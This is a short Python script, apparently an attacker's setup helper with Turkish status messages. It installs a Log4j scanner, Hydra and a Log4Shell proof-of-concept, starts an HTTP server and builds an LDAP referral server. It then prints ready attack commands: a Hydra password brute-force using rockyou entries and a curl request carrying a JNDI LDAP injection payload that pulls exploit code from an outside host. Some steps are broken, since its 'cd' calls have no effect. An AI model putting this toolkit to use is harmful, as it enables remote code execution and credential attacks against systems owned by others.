import os
os.system("sudo apt-get install git")
os.system("git clone https://github.com/fullhunt/log4j-scan")
os.system("cd log4j-scan")
try:
    os.system("pip3 install -r requirements.txt")
except:
    os.system("pip install -r requirements.txt")

print("Scanner tamam, python3 log4j-scan.py -u http://IP_ADDRESS ")
os.system("cd ..")

os.system("sudo gzip -d /usr/share/wordlists/rockyou.txt.gz")
os.system("shuf -n 100 /usr/share/wordlists/rockyou.txt > wordlist.txt")
os.system("sudo apt-get install hydra")

print("BF tamam, hydra IP -L wordlist.txt -P worldist.txt -t 4 SERVIS")

os.system("git clone https://github.com/k4rm3nd3r/Log4Shell_PoC.git")
os.system("cd Log4Shell_PoC")
os.system("rm POC.png")
os.system("rm README.md")
os.system("cd exploit")
try:
    os.system("nohup python -m http.server 8000 &")
except:
    os.system("nohup python3 -m http.server 8000 &")

print("HTTP SERVER TAMAM PORT 8000")

os.system("wget https://mirrors.estointernet.in/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz")
os.system("tar -xvf apache-maven-3.6.3-bin.tar.gz")
os.system("mv apache-maven-3.6.3 /opt/")
with open(".profile", "a") as f:
    f.write("""
M2_HOME='/opt/apache-maven-3.6.3'
PATH="$M2_HOME/bin:$PATH"
export PATH
""")
os.system("cd ..")
os.system("mvn clean package -DskipTests")

print("LDAP SERVER TAMAM KULLANMAK ICIN nohup java -cp ldap_server-1.0-all.jar marshalsec.jndi.LDAPRefServer [string] http://SERVERIP:PYTHONPORTU/#Exploit &")
print("attack için  curl 192.168.174.129:80 -H 'X-Api-Version: ${jndi:ldap://192.168.30.128:1389/a}'")